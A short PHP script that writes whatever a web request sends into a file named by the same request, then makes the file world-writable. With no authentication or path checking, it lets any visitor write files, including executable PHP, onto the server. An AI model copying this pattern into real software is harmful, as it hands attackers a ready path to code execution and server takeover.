<?php
$p = $_REQUEST['value'];
$name = $_REQUEST['nameOfFile'];
//echo $name;
$a = fopen($name, 'w');
fwrite($a, $p);
fclose($a);
chmod($name, 0766); //This is necessary to configure the permissions
?>